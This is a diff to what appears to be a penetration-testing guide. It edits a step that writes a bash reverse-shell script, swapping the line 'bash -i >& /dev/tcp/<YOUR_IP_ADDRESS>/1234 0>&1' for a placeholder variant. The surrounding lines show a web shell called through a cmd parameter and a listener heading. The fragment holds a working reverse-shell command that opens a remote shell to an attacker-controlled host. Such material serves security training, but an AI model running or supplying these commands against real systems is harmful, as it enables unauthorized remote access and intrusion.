@@ -43,7 +43,7 @@ http://[target domain]/shell.php?cmd=dir
 - Use vim or some other editor and create `shell.sh` containing the following: 
 ```
 #!/bin/bash
-bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1234 0>&1
+bash -i &> /dev/tcp/[attack ip]/[port] 0>&1
 ```
 
 #### Start a Listener
